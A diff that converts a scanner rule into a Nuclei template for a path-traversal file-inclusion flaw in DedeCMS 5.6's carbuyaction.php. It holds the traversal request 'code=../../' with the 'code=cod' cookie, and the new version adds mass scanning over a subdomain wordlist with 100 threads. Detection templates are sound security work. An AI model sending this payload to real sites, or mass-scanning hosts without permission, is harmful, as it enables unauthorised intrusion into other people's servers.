@@ -1,33 +1,35 @@
 id: dedecms-carbuyaction-fileinclude
 
 info:
-    name: DedeCmsV5.6 Carbuyaction Fileinclude
-    author: harris2015(https://github.com/harris2015)
-    severity: high
-    verified: true
-    description: |
-        A vulnerability in DedeCMS's 'carbuyaction.php' endpoint allows remote attackers to return the content of locally stored files via a vulnerability in the 'code' parameter.
-        shodan-query: http.html:"power by dedecms" || title:"dedecms"
-        app="DedeCMS"
-    reference:
-        - https://www.cnblogs.com/milantgh/p/3615986.html
+  name: DedeCmsV5.6 Carbuyaction Fileinclude
+  author: pikpikcu
+  severity: high
+  reference: https://www.cnblogs.com/milantgh/p/3615986.html
+  tags: dedecms
 
-rules:
-    r0:
-        request:
-            method: GET
-            path: /plus/carbuyaction.php?dopost=return&code=../../
-            headers:
-                Cookie: code=alipay
-            follow_redirects: true
-        expression: response.status == 200
-    r1:
-        request:
-            method: GET
-            path: /plus/carbuyaction.php?dopost=return&code=../../
-            headers:
-                Cookie: code=cod
-            follow_redirects: true
-        expression: response.status == 200 && response.body.bcontains(bytes("Cod::respond()"))
-expression: r0() && r1()
+requests:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
+    raw:
+      - |
+        GET /plus/carbuyaction.php?dopost=return&code=../../ HTTP/1.1
+        Host: {{Subdomains}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Cookie: code=cod
+    matchers-condition: and
+    matchers:
+
+      - type: word
+        words:
+          - "Cod::respond()"
+        part: body
+        condition: and
+
+      - type: status
+        status:
+          - 200
